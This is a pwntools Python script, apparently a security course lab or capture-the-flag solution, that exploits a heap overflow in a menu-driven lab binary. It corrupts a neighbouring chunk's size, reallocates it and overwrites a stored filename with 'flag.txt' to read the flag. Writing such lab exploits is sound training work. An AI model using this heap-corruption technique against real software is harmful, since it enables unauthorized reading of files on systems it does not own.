''' Script Module Importing '''from pwn import *import string''' Establish Connection '''p = remote("csc748.hostbin.org", 7092)      # Test Script Against Server# p = process("./9-2_lab.bin")              # Test Script Locally# p = gdb.debug("./9-2_lab.bin")            # Debug with GDB#Step 1: Allocate three chunks, a, b, cprint("\n[*] Allocating Chunks")# Allocate A and Bp.sendlineafter(b"Choice: ", b'1')          # Select Option (1) New to Allocate Chunk 'A'p.sendlineafter(b"Size: ", b'24')           # Set Sizep.sendlineafter(b"Contents: ", b'A'*16)      # Fill Chunkprint("    [-] Chunk A Allocated")p.sendlineafter(b"Choice: ", b'1')          # Select Option (1) New to Allocate Chunk 'B'p.sendlineafter(b"Size: ", b'24')           # Set Sizep.sendlineafter(b"Contents: ", b'B'*16)      # Fill Chunkprint("    [-] Chunk B Allocated")p.sendlineafter(b"Choice: ", b'3')          # Select Option (3) Setup filename to Allocate Chunk 'C'print("    [-] Chunk C Allocated")#Step 2: Overflow a, changing bâ€™s size!print("\n[*] Overflow Chunk A to Change Size of B")p.sendlineafter(b"Choice: ", b'2')          # Select Option (2) Delete to Free Chunk 'A'p.sendlineafter(b"ID?: ", b'0')             # Select Chunkprint("    [-] Chunk A Deleted")p.sendlineafter(b"Choice: ", b'1')          # Select Option (1) New to Allocate Chunk 'A'p.sendlineafter(b"Size: ", b'24')           # Set Sizep.sendlineafter(b"Contents: ", b'A'*25)      # Overflow Chunk to change size of Chunk 'B' to 40print("    [!] Chunk A Re-Allocated and Overflowed Successfully")#Step 3: Free b, adding it to the freelistprint("\n[*] Free B ")p.sendlineafter(b"Choice: ", b'2')          # Select Option (2) Delete to Free Chunk 'B'p.sendlineafter(b"ID?: ", b'1')             # Select Chunkprint("    [-] Chunk B Deleted")#Step 4: Allocate new chunk of that sizeprint("\n[*] Allocate Chuck to New Size of B ")p.sendlineafter(b"Choice: ", b'1')          # Select Option (1) New to Allocate Chunk 'B'p.sendlineafter(b"Size: ", b'56')           # Set Sizeprint("    [!] Chunk B Re-Allocated and Resized Successfully")print("\n[*] Overwrite Contents of C ")contents = b'C'*32+b'flag.txt'p.sendlineafter(b"Contents: ", contents)      # Overflow Chunk to change size of Chunk 'B' to 40print("    [!] Filename Updated to 'flag.txt' Successfully ")# Step 5: Recieve Flagprint("\n[*] Reading Flag Chunk")p.sendlineafter(b"Choice: ", b'4')          # Select Option (4) Read filep.recvuntil(b"contents: ")      # Discard Program Outputflag = p.recvuntil(b"}").decode('utf-8')    # Extract Flagprint(f"\n[*] Flag Successfully Obtained: {flag}") # Print Flag